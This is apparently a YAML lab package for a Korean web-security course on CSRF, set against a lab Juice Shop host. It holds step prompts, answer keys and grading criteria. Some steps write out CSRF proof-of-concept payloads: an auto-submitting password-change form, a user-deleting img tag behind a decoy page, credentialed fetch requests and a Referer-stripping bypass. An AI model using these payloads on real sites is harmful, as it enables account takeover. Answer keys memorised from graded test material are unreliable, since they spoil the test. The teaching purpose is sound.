lab_id: web-vuln-ai-week04
title: CSRF(Cross-Site Request Forgery) 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 4
description: |
  CSRF (Cross-Site Request Forgery) 의 원리·PoC·방어를 Juice Shop (http://juice.6v6.lab) 환경에서
  학습한다. Juice Shop 은 Angular SPA + JWT-in-Header 인증 모델 — 전통적 CSRF (Cookie 자동
  첨부) 가 자동발동 불가능한 modern stack 이라는 사실 자체가 핵심 학습 결과. 이를 통해
  Cookie + Session 기반 legacy 시스템 의 CSRF 위협 모델과 modern SPA + JWT 의 차이를
  명확히 구분한다. 16 step 모두 attacker 컨테이너 (curl/wget/python) 에서 실행하며 stdout
  을 직접 quote 해야 채점 통과.
difficulty: medium
duration_minutes: 120
objectives:
- CSRF 의 원리 (피해자 브라우저 + 자동 cookie 첨부) 와 자동발동 조건을 이해한다
- Juice Shop 의 JWT-Header 인증이 왜 CSRF 면역인지 분석한다 (학습 핵심)
- CSRF 토큰 / SameSite / Referer / CORS 4 계층 방어를 비교한다
- legacy Cookie 기반 시스템 의 CSRF PoC (auto-submit form, img src, fetch credentials) 작성
- 인증방식 × CSRF 방어 매트릭스로 시스템 별 권고를 도출한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: |
    [목표] Juice Shop (http://juice.6v6.lab) 의 메인 HTML 응답에서 CSRF 토큰 (hidden input,
    meta tag, JS 변수) 존재 여부를 확인한다.

    [배경] CSRF 토큰은 *Cookie + Session* 인증을 쓰는 SSR (Django/Rails/Spring MVC) 에서
    필수다. 서버가 form 응답에 `<input type="hidden" name="csrf_token" value="...">` 을
    심어, 다음 POST 에서 token 일치 확인. 외부 사이트는 token 을 알 수 없으니 위조 차단.

    [실행]
      curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10

    [예상 결과] 빈 출력 (또는 Angular framework 의 hidden input 일부 만). 즉 **CSRF 토큰
    없음**. Juice Shop = Angular SPA + JWT-Header 인증이라 cookie 가 자동 첨부되지 않는다 →
    CSRF 가 자동발동 불가능 → 토큰 자체가 불필요한 *modern* 패턴.

    [도구] **curl 단독 의존 금지** — wget / nikto -Tuning x / python BeautifulSoup 도 가능.
    호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.
  hint: |
    grep 결과가 비어 있으면 "CSRF 토큰 없음" 이 정상. 그것이 곧 Juice Shop = JWT-Header
    의 증거. Cookie 인증 시스템 (DVWA, WordPress 등) 의 form 과 비교해 보면 차이가 명확.
  category: csrf_detect
  points: 8
  answer: |
    🤖 프롬프트: Juice Shop (http://juice.6v6.lab) 의 메인 페이지에 CSRF 토큰 hidden input
    이 있는지 확인하고, 결과로부터 인증 모델 (Cookie+Session vs JWT-Header) 을 추정해줘.

    📎 참고 (CLI):
      curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10 \
        && echo 'CSRF 토큰 확인 완료'
  answer_detail: |
    Juice Shop = Angular SPA + JWT-Header 인증. CSRF 토큰 hidden input 이 없는 것이 정상
    이며 modern SPA 의 표준 패턴이다. 반면 Django form, Spring MVC, Rails ERB 같은 SSR +
    Session Cookie 시스템은 csrf_token 필수. 이 step 의 빈 출력은 "취약" 이 아니라 "다른
    위협 모델" 의 증거임을 학습한다.
  verify:
    type: output_contains
    expect:
    - CSRF 토큰 확인 완료
    - http_request
    field: stdout
    semantic:
      intent: |
        Juice Shop HTML 응답에서 CSRF 토큰 (hidden input / meta / JS) 존재 여부 확인. 빈
        결과 = Angular SPA + JWT-Header 인증의 정상 결과 — 학습 핵심.
      success_criteria:
      - curl 로 메인 페이지 가져와 csrf|_token|hidden grep 실행
      - 출력 결과 (빈 출력 또는 일부 Angular hidden input) 의 의미 해석
      - Juice Shop = JWT-Header 라 CSRF 토큰 불필요 사실 명시
      - SSR + Session Cookie 시스템 (Django/Rails) 과의 차이 언급
      acceptable_methods:
      - curl <url> | grep -iE 'csrf|_token|hidden'
      - wget -qO- + grep
      - python BeautifulSoup 로 input 분석
      - browser dev tools DOM 검사
      negative_signs:
      - 빈 결과를 "취약" 으로 오판 (실제는 다른 위협 모델)
      - 인증 모델 (JWT vs Cookie) 추정 누락
      - SSR 시스템과의 차이 설명 없음
  target_vm: attacker
  script: |
    curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10
    echo 'CSRF 토큰 확인 완료'
  risk_level: low
  bastion_prompt: |
    Juice Shop (http://juice.6v6.lab) 의 메인 페이지에 CSRF 토큰 hidden input 이 있는지
    확인하고, 결과로부터 인증 모델 (Cookie+Session vs JWT-Header) 을 추정해줘.

    실행: curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10

    빈 결과가 정상 (Angular SPA + JWT-Header). 출력 1-3줄 ``` 블록으로 quote 한 뒤,
    Juice Shop 의 인증 모델 추정과 그 근거 명시. 마지막에 'CSRF 토큰 확인 완료' echo.
- order: 2
  instruction: |
    [목표] 가상의 Cookie + Session 사이트 의 패스워드 변경 endpoint 를 위조하는 CSRF PoC
    HTML 페이지를 작성한다 (legacy 시나리오 시연).

    [배경] 전형적 CSRF = 피해자가 *이미 로그인된* 사이트의 cookie 가 자동 첨부되는 점을 악용.
    공격자 페이지가 hidden form 을 자동 submit → 피해자의 cookie 가 함께 전송되어 서버는
    정상 요청으로 인식.

    [Juice Shop 적용성] Juice Shop 자체는 JWT-Header 라 PoC 가 *작동 안 함* — 그러나 PoC
    의 *구조* 자체는 Cookie 기반 시스템 (DVWA, WordPress wp-admin, 기업 내 form-based
    web) 에 그대로 적용 가능. 작동 여부 확인 보다 *PoC 구조 이해* 가 목표.

    [실행]
      cat > /tmp/csrf_poc.html <<'HTML'
      <html><body onload="document.forms[0].submit()">
        <form action="http://juice.6v6.lab/profile" method="POST">
          <input type="hidden" name="password" value="hacked123">
        </form>
      </body></html>
      HTML
      head -c 200 /tmp/csrf_poc.html && echo
      echo 'CSRF PoC 작성 완료'

    [도구 권장] curl + cookie jar (-b -c), HTML form 작성, browser 로 PoC 페이지 직접 로드
    가능. 호출 후 **stdout 1~3줄을 ``` 블록으로 직접 quote**.
  hint: |
    onload 자동 submit + hidden input 으로 새 비밀번호 지정 + form action 에 대상 URL.
    legacy Cookie 시스템 가정. Juice Shop 의 JWT-Header 에서는 안 작동.
  category: csrf_craft
  points: 10
  answer: |
    🤖 프롬프트: 가상 Cookie 기반 사이트 (예: WordPress) 의 패스워드 변경 endpoint 를 위조
    하는 auto-submit CSRF PoC HTML 을 /tmp/csrf_poc.html 로 작성하고, Juice Shop 에서는
    왜 작동하지 않는지 설명해줘.

    📎 참고 (CLI):
      cat > /tmp/csrf_poc.html <<'HTML'
      <html><body onload="document.forms[0].submit()">
        <form action="http://juice.6v6.lab/profile" method="POST">
          <input type="hidden" name="password" value="hacked123">
        </form>
      </body></html>
      HTML
      head -c 200 /tmp/csrf_poc.html && echo
      echo 'CSRF PoC 작성 완료'
  answer_detail: |
    auto-submit form 은 피해자가 페이지를 *열기만 하면* 즉시 POST 가 발생하는 핵심 CSRF
    벡터. 단 이 공격은 (1) 피해자가 *대상 사이트에 로그인 중* + (2) 인증이 *cookie + SameSite
    완화* + (3) form action 의 endpoint 가 *Origin/Referer 검증 없음* — 3 조건이 모두 성립
    해야 작동. Juice Shop 은 (1) 만 있고 (2)(3) 가 차단 — JWT-Header 인증이라 cookie 자동
    첨부 자체가 없다.
  verify:
    type: output_contains
    expect: CSRF PoC 작성 완료
    field: stdout
    semantic:
      intent: |
        auto-submit CSRF PoC HTML 작성 — form action + hidden input + body onload submit.
        Legacy Cookie 시스템 가정. Juice Shop 의 JWT-Header 에선 작동 안 함 사실 명시.
      success_criteria:
      - /tmp/csrf_poc.html 파일 생성 + head 출력 quote
      - form action 에 대상 URL + method=POST 포함
      - hidden input 으로 변경할 값 (new password) 지정
      - body onload 자동 submit 또는 iframe src 자동 실행 메커니즘 명시
      - Juice Shop 의 JWT-Header 에서 작동 안 하는 이유 (cookie 자동첨부 부재) 한 줄 명시
      acceptable_methods:
      - HTML form body onload submit
      - iframe srcdoc 로 내장
      - JavaScript fetch POST + credentials include
      - BeEF module 활용
      negative_signs:
      - form action URL 누락
      - 자동 submit 미설정 (사용자 클릭 필요)
      - JWT-Header 에서 안 작동 한다는 사실 누락
      - PoC 작동 전제 (cookie+session) 조건 분석 없음
  target_vm: attacker
  script: |
    cat > /tmp/csrf_poc.html <<'HTML'
    <html><body onload="document.forms[0].submit()">
      <form action="http://juice.6v6.lab/profile" method="POST">
        <input type="hidden" name="password" value="hacked123">
      </form>
    </body></html>
    HTML
    head -c 200 /tmp/csrf_poc.html && echo
    echo 'CSRF PoC 작성 완료'
  risk_level: low
  bastion_prompt: |
    Legacy Cookie 기반 시스템 가정한 패스워드 변경 위조 auto-submit CSRF PoC HTML 을
    /tmp/csrf_poc.html 로 작성. 다음 헤레닥 명령 실행 후 head 결과 quote:

      cat > /tmp/csrf_poc.html <<'HTML'
      <html><body onload="document.forms[0].submit()">
        <form action="http://juice.6v6.lab/profile" method="POST">
          <input type="hidden" name="password" value="hacked123">
        </form>
      </body></html>
      HTML
      head -c 200 /tmp/csrf_poc.html && echo
      echo 'CSRF PoC 작성 완료'

    마지막에 Juice Shop 의 JWT-Header 에서는 왜 작동 안 하는지 한 문장 설명.
- order: 3
  instruction: |
    [목표] `<img src>` 태그를 이용한 GET 기반 CSRF PoC 를 작성하고, RESTful 원칙 위반과의
    관계를 분석한다.

    [배경] 브라우저는 `<img src="...">` 의 URL 을 자동 GET 한다. 만약 서버가 GET 메서드로
    *상태 변경* (계정 삭제, 송금 등) 을 허용한다면, 단순한 이미지 태그만으로 피해자 cookie
    가 자동 첨부된 GET 요청이 발생 → CSRF 성립.

    [근본 원인] RFC 7231 §4.2.1: GET 은 *safe* (서버 상태 변경 금지). 이 원칙을 위반한 API
    설계 (예: `/api/users/1/delete` GET) 가 곧 CSRF 공격면.

    [실행]
      cat > /tmp/csrf_get.html <<'HTML'
      <html><body>
        <h1>Cute kitten gallery</h1>
        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
      </body></html>
      HTML
      head -c 300 /tmp/csrf_get.html && echo
      echo 'GET CSRF PoC 작성 완료'

    [도구 권장] curl + cookie jar, HTML form 작성, browser 로 페이지 로드. 호출 후
    **stdout 1~3줄 ``` 블록 quote**.
  hint: |
    img src 에 상태 변경 URL 삽입. RESTful 원칙 (GET = safe) 위반 분석 포함. 다른 벡터:
    `<link rel=prefetch>`, `<script src>`, CSS `background-image: url(...)`.
  category: csrf_craft
  points: 10
  answer: |
    🤖 프롬프트: img 태그를 이용한 GET 기반 CSRF PoC HTML 을 /tmp/csrf_get.html 로 작성
    하고, GET 메서드로 상태 변경을 허용한 설계가 왜 위험한지 RFC 7231 관점에서 설명해줘.

    📎 참고 (CLI):
      cat > /tmp/csrf_get.html <<'HTML'
      <html><body>
        <h1>Cute kitten gallery</h1>
        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
      </body></html>
      HTML
      head -c 300 /tmp/csrf_get.html && echo
      echo 'GET CSRF PoC 작성 완료'
  answer_detail: |
    GET = safe method (RFC 7231) — 상태 변경 금지가 원칙. 위반 시 (1) img 태그 한 줄로
    CSRF 가능 (2) 브라우저 history / 프록시 / 로그에 민감 작업 노출 (3) prefetch / link
    rel 등 다양한 자동 GET 벡터에 노출. 대응: 상태 변경은 항상 POST/PUT/DELETE + CSRF
    토큰 + Origin 검증.
  verify:
    type: output_contains
    expect: GET CSRF PoC 작성 완료
    field: stdout
    semantic:
      intent: |
        GET 기반 CSRF PoC — img src 에 상태 변경 URL. 페이지 로드만으로 자동 GET 발생.
        RFC 7231 GET-safe 원칙 위반과의 관계 분석.
      success_criteria:
      - /tmp/csrf_get.html 생성 + head 출력 quote
      - img src 에 GET 상태변경 URL (예 /api/Users/1?_method=DELETE) 포함
      - 페이지 방문만으로 요청 발생 메커니즘 설명
      - RFC 7231 GET=safe 원칙과 위반 시 위험성 명시
      acceptable_methods:
      - img src <target url>
      - link rel=prefetch
      - iframe src
      - CSS background-image:url(...)
      - script src
      negative_signs:
      - POST 메서드로 오해
      - GET-safe 원칙 언급 없음
      - 자동 GET 벡터 단일 (img 만)
  target_vm: attacker
  script: |
    cat > /tmp/csrf_get.html <<'HTML'
    <html><body>
      <h1>Cute kitten gallery</h1>
      <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
    </body></html>
    HTML
    head -c 300 /tmp/csrf_get.html && echo
    echo 'GET CSRF PoC 작성 완료'
  risk_level: low
  bastion_prompt: |
    GET 기반 CSRF PoC HTML 을 /tmp/csrf_get.html 로 작성. 다음 헤레닥 실행 후 head 출력
    quote:

      cat > /tmp/csrf_get.html <<'HTML'
      <html><body>
        <h1>Cute kitten gallery</h1>
        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
      </body></html>
      HTML
      head -c 300 /tmp/csrf_get.html && echo
      echo 'GET CSRF PoC 작성 완료'

    마지막에 RFC 7231 GET-safe 원칙과 위반 시 위험성 한 문장 설명.
- order: 4
  instruction: 'AJAX 기반 CSRF를 작성하시오: fetch API 활용.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_craft` 에 적합한 도구: curl + cookie jar (-b -c),
    HTML form 작성. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: 'fetch로 credentials: include 옵션을 사용하세요.'
  category: csrf_craft
  points: 10
  answer: '🤖 프롬프트: AJAX 기반 CSRF를 작성하시오: fetch API 활용 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): echo ''fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})''
    && echo ''AJAX CSRF 작성 완료'''
  answer_detail: 'credentials: include로 쿠키가 자동 첨부되어 인증된 요청을 위조합니다.'
  verify:
    type: output_contains
    expect: AJAX CSRF 작성 완료
    field: stdout
    semantic:
      intent: AJAX 기반 CSRF — fetch 또는 XMLHttpRequest 로 credentials include 요청해 세션
        쿠키 사용
      success_criteria:
      - fetch(<url>, {method:POST, credentials:include}) 형태
      - CORS Preflight 발생 여부 분석
      - simple request 와 preflight 요청의 구분 설명
      acceptable_methods:
      - fetch credentials:include
      - XMLHttpRequest withCredentials=true
      - axios withCredentials 설정
      - JSONP 악용 (구형)
      negative_signs:
      - credentials 설정 누락
      - CORS preflight 언급 없음
      - JSON 엔드포인트에 단순 POST 만
  target_vm: attacker
  script: echo 'fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})'
    && echo 'AJAX CSRF 작성 완료'
  risk_level: low
  bastion_prompt: 'AJAX 기반 CSRF를 작성하시오: fetch API 활용.


    [도구 권장] csrf_craft: curl + cookie jar (-b -c), HTML form 작성. curl 만 쓰지 말고 **curl
    + cookie jar (-b -c)** 등 적합 도구로 호출 후 stdout quote.'
- order: 5
  instruction: 'SameSite 쿠키 속성의 CSRF 방어 효과를 분석하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: Set-Cookie 헤더에서 SameSite를 확인하세요.
  category: csrf_defense
  points: 10
  answer: '🤖 프롬프트: SameSite 쿠키 속성의 CSRF 방어 효과를 분석해줘

    📎 참고 (CLI): curl -sI http://juice.6v6.lab | grep -i ''set-cookie'' && echo ''SameSite
    분석 완료'''
  answer_detail: SameSite=Strict는 모든 크로스사이트 요청에서 쿠키 전송을 차단합니다.
  verify:
    type: output_contains
    expect: SameSite 분석 완료
    field: stdout
    semantic:
      intent: SameSite 쿠키 CSRF 방어 — Strict/Lax/None 차이와 현대 브라우저 Lax 기본값 영향
      success_criteria:
      - SameSite Strict/Lax/None 3단계 차이 설명
      - Lax 의 top-level GET 예외 언급
      - Chrome 2020 이후 Lax 기본값이 CSRF 대부분 차단함 언급
      acceptable_methods:
      - Set-Cookie 헤더 옵션 확인
      - OWASP Session Management
      - Chrome Cookie Policy 문서
      - SameSite Cookies by Scott Helme
      negative_signs:
      - 3단계 중 일부만 설명
      - 기본값 변경 언급 없음
      - None Secure 필수성 누락
  target_vm: attacker
  script: curl -sI http://juice.6v6.lab | grep -i 'set-cookie' && echo 'SameSite 분석
    완료'
  risk_level: low
  bastion_prompt: 'SameSite 쿠키 속성의 CSRF 방어 효과를 분석해줘


    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
    등 적합 도구로 호출 후 stdout quote.'
- order: 6
  instruction: 'CSRF 토큰 검증 로직의 약점을 분석하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_bypass` 에 적합한 도구: curl 로 토큰 누락/재사용 시도. 도구
    호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: 토큰 재사용, 빈 토큰 등을 테스트하세요.
  category: csrf_bypass
  points: 12
  answer: '🤖 프롬프트: CSRF 토큰 검증 로직의 약점을 분석해줘

    📎 참고 (CLI): echo ''=== CSRF 토큰 약점 ==='' && echo ''1. 토큰 미검증'' && echo ''2. 빈 토큰
    허용'' && echo ''3. 토큰 재사용'' && echo ''CSRF 토큰 분석 완료'''
  answer_detail: CSRF 토큰 구현 오류로 방어가 무효화될 수 있습니다.
  verify:
    type: output_contains
    expect: CSRF 토큰 분석 완료
    field: stdout
    semantic:
      intent: CSRF 토큰 검증 약점 — 토큰 비교 누락, 빈 토큰 허용, GET 메서드 예외, 전역 토큰 재사용 등 결함
      success_criteria:
      - 최소 3가지 구현 결함 열거(비교 누락, 빈 문자열 허용, 세션 무관 토큰)
      - Burp Repeater 로 토큰 삭제/수정 후 요청 시도
      - 방어 (HMAC 기반 토큰, 세션 바인딩) 언급
      acceptable_methods:
      - Burp Repeater 로 토큰 필드 제거
      - python requests 로 토큰 조작 테스트
      - OWASP CSRF Prevention 가이드 참조
      - OWASP ZAP CSRF active scan
      negative_signs:
      - 약점 1가지만
      - 실제 테스트 없이 개념만
      - 방어 방안 없음
  target_vm: attacker
  script: echo '=== CSRF 토큰 약점 ===' && echo '1. 토큰 미검증' && echo '2. 빈 토큰 허용' && echo
    '3. 토큰 재사용' && echo 'CSRF 토큰 분석 완료'
  risk_level: low
  bastion_prompt: 'CSRF 토큰 검증 로직의 약점을 분석해줘


    [도구 권장] csrf_bypass: curl 로 토큰 누락/재사용 시도. curl 만 쓰지 말고 **curl 로 토큰 누락/재사용 시도**
    등 적합 도구로 호출 후 stdout quote.'
- order: 7
  instruction: 'Referer 헤더 기반 CSRF 방어를 우회하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_bypass` 에 적합한 도구: curl 로 토큰 누락/재사용 시도. 도구
    호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: Referer를 제거하는 기법을 사용하세요.
  category: csrf_bypass
  points: 10
  answer: '🤖 프롬프트: Referer 헤더 기반 CSRF 방어를 우회해줘

    📎 참고 (CLI): echo ''<meta name="referrer" content="no-referrer">'' && echo ''Referer
    우회 기법 완료'''
  answer_detail: meta 태그로 Referer 전송을 방지하면 서버의 Referer 검증을 우회할 수 있습니다.
  verify:
    type: output_contains
    expect:
    - Referer 우회 기법 완료
    - curl
    field: stdout
    semantic:
      intent: Referer 기반 방어 우회 — Referer 헤더 삭제, data URL 사용, subdomain 스푸핑으로 우회
      success_criteria:
      - Referer-Policy no-referrer 적용해 헤더 제거 기법
      - data URL 또는 HTTPS to HTTP 전환으로 Referer 미전송
      - Referer-only 방어의 근본 한계 설명
      acceptable_methods:
      - meta referrer=no-referrer 또는 Referrer-Policy
      - rel=noreferrer 링크 속성
      - Subdomain takeover 로 Referer 위조
      - curl -e  로 Referer 없는 요청
      negative_signs:
      - 헤더 조작 시도 없음
      - 단일 우회 기법만
      - 방어 한계 분석 없음
  target_vm: attacker
  script: echo '<meta name="referrer" content="no-referrer">' && echo 'Referer 우회
    기법 완료'
  risk_level: low
  bastion_prompt: 'Referer 헤더 기반 CSRF 방어를 우회해줘


    [도구 권장] csrf_bypass: curl 로 토큰 누락/재사용 시도. curl 만 쓰지 말고 **curl 로 토큰 누락/재사용 시도**
    등 적합 도구로 호출 후 stdout quote.'
- order: 8
  instruction: 'JSON 기반 엔드포인트의 CSRF 가능성을 분석하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_advanced` 에 적합한 도구: Burp 매크로 또는 curl + jq.
    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: Content-Type 제한을 확인하세요.
  category: csrf_advanced
  points: 10
  answer: "\U0001F916 프롬프트: JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘\n\U0001F4CE 참고 (CLI): curl\
    \ -s -X POST http://juice.6v6.lab/api/test \\\n  -H 'Content-Type: text/plain' \\\
    \n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
  answer_detail: 서버가 Content-Type을 검증하지 않으면 text/plain으로 JSON 데이터를 전송할 수 있습니다.
  verify:
    type: output_contains
    expect: JSON CSRF 분석 완료
    field: stdout
    semantic:
      intent: JSON 엔드포인트 CSRF — Content-Type application/json 요구로 simple request 불가능,
        그러나 Flash/특정 우회 가능
      success_criteria:
      - JSON POST 는 simple request 아니므로 preflight 발생함 설명
      - Content-Type text/plain 우회 또는 XHR boundary 조작 공격 벡터
      - CSRF 토큰이 여전히 필요한 이유 언급
      acceptable_methods:
      - curl -H Content-Type:application/json -d {...}
      - Flash XHR (구형) 또는 form trickery
      - fetch 로 Content-Type 조작
      - CORS misconfigured allow any origin 와 결합
      negative_signs:
      - simple vs preflight 구분 없음
      - JSON 만으로 CSRF 완전 차단된다고 오판
      - CORS 연계 없음
  target_vm: attacker
  script: "curl -s -X POST http://juice.6v6.lab/api/test \\\n  -H 'Content-Type: text/plain'\
    \ \\\n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
  risk_level: low
  bastion_prompt: 'JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘


    [도구 권장] csrf_advanced: Burp 매크로 또는 curl + jq. curl 만 쓰지 말고 **Burp 매크로 또는 curl
    + jq** 등 적합 도구로 호출 후 stdout quote.'
- order: 9
  instruction: 'CORS 설정과 CSRF의 관계를 분석하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_advanced` 에 적합한 도구: Burp 매크로 또는 curl + jq.
    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: Access-Control 헤더를 확인하세요.
  category: csrf_advanced
  points: 10
  answer: "\U0001F916 프롬프트: CORS 설정과 CSRF의 관계를 분석해줘\n\U0001F4CE 참고 (CLI): curl -sI\
    \ \\\n  -H 'Origin: http://evil.com' http://juice.6v6.lab \\\n | grep -i 'access-control'\
    \ && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
  answer_detail: CORS 와일드카드(*)는 credentials와 함께 사용 불가하지만 특정 Origin 반사는 위험합니다.
  verify:
    type: output_contains
    expect:
    - 완료
    - Access
    - Control
    field: stdout
    semantic:
      intent: CORS 설정과 CSRF 관계 — Access-Control-Allow-Credentials true + Allow-Origin
        wildcard/reflection 시 CSRF 심화
      success_criteria:
      - preflight 없는 simple request 와 preflight 요구 차이
      - ACAO wildcard + credentials 불가 원칙
      - 반사형 Origin 정책 취약점 및 subdomain takeover 연계
      acceptable_methods:
      - curl -H Origin:https://evil.com <url>
      - corsy 자동 스캐너
      - Burp CORS * scanner
      - Mozilla CORS 문서
      negative_signs:
      - CORS 만 언급하고 CSRF 연결 없음
      - credentials 규칙 설명 없음
      - Origin 반사 위험 누락
  target_vm: attacker
  script: "curl -sI \\\n  -H 'Origin: http://evil.com' http://juice.6v6.lab \\\n | grep\
    \ -i 'access-control' && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
  risk_level: low
  bastion_prompt: 'CORS 설정과 CSRF의 관계를 분석해줘


    [도구 권장] csrf_advanced: Burp 매크로 또는 curl + jq. curl 만 쓰지 말고 **Burp 매크로 또는 curl
    + jq** 등 적합 도구로 호출 후 stdout quote.'
- order: 10
  instruction: 'CSRF와 XSS 체인 공격을 설계하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_advanced` 에 적합한 도구: Burp 매크로 또는 curl + jq.
    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: XSS로 CSRF 토큰을 탈취하는 시나리오를 구성하세요.
  category: csrf_advanced
  points: 10
  answer: '🤖 프롬프트: CSRF와 XSS 체인 공격을 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): echo ''=== XSS+CSRF 체인 ==='' && echo ''1. XSS로 CSRF 토큰 읽기'' && echo
    ''2. 탈취 토큰으로 CSRF 요청'' && echo ''3. 방어 우회 성공'' && echo ''체인 공격 설계 완료'''
  answer_detail: XSS가 존재하면 CSRF 토큰 방어가 무효화됩니다.
  verify:
    type: output_contains
    expect: 체인 공격 설계 완료
    field: stdout
    semantic:
      intent: CSRF + XSS 체인 — XSS 로 CSRF 토큰 조회 후 악성 요청 전송 (Same-Origin 정책 하에서 가능)
      success_criteria:
      - XSS 로 토큰 DOM 조회 JS 예시 (document.querySelector)
      - 토큰을 포함한 fetch/XHR 로 상태 변경 요청
      - XSS 가 있으면 CSRF 방어가 무력화됨 설명
      acceptable_methods:
      - document.querySelector to read token
      - fetch with token in headers
      - BeEF 모듈 exploit chain
      - XSSHunter + custom payload
      negative_signs:
      - XSS 없이 CSRF 만
      - 토큰 조회 메커니즘 누락
      - 체인 공격 흐름 설명 없음
  target_vm: attacker
  script: echo '=== XSS+CSRF 체인 ===' && echo '1. XSS로 CSRF 토큰 읽기' && echo '2. 탈취 토큰으로
    CSRF 요청' && echo '3. 방어 우회 성공' && echo '체인 공격 설계 완료'
  risk_level: low
  bastion_prompt: 'CSRF와 XSS 체인 공격을 설계하시오.


    [도구 권장] csrf_advanced: Burp 매크로 또는 curl + jq. curl 만 쓰지 말고 **Burp 매크로 또는 curl
    + jq** 등 적합 도구로 호출 후 stdout quote.'
- order: 11
  instruction: 'Double Submit Cookie 방어 기법을 분석하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: 쿠키와 요청 파라미터의 토큰 비교를 설명하세요.
  category: csrf_defense
  points: 10
  answer: '🤖 프롬프트: Double Submit Cookie 방어 기법을 분석해줘

    📎 참고 (CLI): echo ''=== Double Submit Cookie ==='' && echo ''1. 서버가 랜덤 토큰을 쿠키로
    설정'' && echo ''2. 클라이언트가 헤더에 복사'' && echo ''3. 서버가 일치 확인'' && echo ''Double Submit
    분석 완료'''
  answer_detail: 크로스사이트에서는 쿠키 값을 읽을 수 없으므로 헤더에 복사할 수 없습니다.
  verify:
    type: output_contains
    expect: Double Submit 분석 완료
    field: stdout
    semantic:
      intent: Double Submit Cookie — 쿠키 토큰과 헤더/폼 토큰 일치 검증, 서버 세션 저장 불필요한 Stateless
        방식
      success_criteria:
      - 쿠키 토큰 + X-CSRF-Token 헤더 동시 전송 구조 설명
      - HttpOnly 쿠키면 JS 가 읽을 수 없어 공격자 토큰 생성 불가 원리
      - 한계(subdomain 쿠키 변조 위험) 언급
      acceptable_methods:
      - OWASP Double Submit Cookie 가이드
      - Django/Rails 구현 예시
      - Cloudflare __cf_bm 유사 구조
      - Signed Double Submit 변형
      negative_signs:
      - Synchronizer Token 과 혼동
      - HttpOnly 역할 설명 없음
      - Stateless 이점 누락
  target_vm: attacker
  script: echo '=== Double Submit Cookie ===' && echo '1. 서버가 랜덤 토큰을 쿠키로 설정' && echo
    '2. 클라이언트가 헤더에 복사' && echo '3. 서버가 일치 확인' && echo 'Double Submit 분석 완료'
  risk_level: low
  bastion_prompt: 'Double Submit Cookie 방어 기법을 분석해줘


    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
    등 적합 도구로 호출 후 stdout quote.'
- order: 12
  instruction: '프레임워크별 CSRF 방어 기능을 비교하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: Django, Spring, Express 등의 CSRF 방어를 정리하세요.
  category: csrf_defense
  points: 10
  answer: '🤖 프롬프트: 프레임워크별 CSRF 방어 기능을 비교해줘

    📎 참고 (CLI): echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo
    ''Spring: CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
  answer_detail: 대부분의 현대 프레임워크는 CSRF 방어를 내장하고 있습니다.
  verify:
    type: output_contains
    expect: 프레임워크 비교 완료
    field: stdout
    semantic:
      intent: 프레임워크별 CSRF 방어 — Django csrf_token, Rails authenticity_token, Spring
        CsrfFilter, Express csurf 비교
      success_criteria:
      - 3개 이상 프레임워크의 CSRF 방어 기능 이름과 활성화 방법
      - 자동 vs 수동 토큰 삽입 차이
      - 취약 설정(disable_csrf) 언급
      acceptable_methods:
      - 표 형식 프레임워크 비교
      - 각 docs 링크 참조
